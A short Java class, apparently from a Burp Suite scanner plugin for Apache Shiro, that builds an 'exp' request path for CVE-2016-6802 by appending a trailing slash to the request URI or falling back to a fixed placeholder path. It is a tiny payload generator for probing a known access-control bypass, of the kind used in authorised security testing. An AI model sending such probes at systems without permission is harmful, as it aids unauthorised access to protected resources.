package burp.core.scanner.active.shiroscanner;

public class CVE_2016_6802 {
    public String exp;

    CVE_2016_6802(String requestURI){
        // CVE_2016_6802
        if (!requestURI.endsWith("/")){
            this.exp = requestURI + "/";
        }else{
            this.exp = "/xxxxxxxxxxxxxxxxxxxxxx";
        }
    }

    public String getExp() {
        return exp;
    }

    @Override
    public String toString() {
        return "CVE_2016_6802";
    }
}
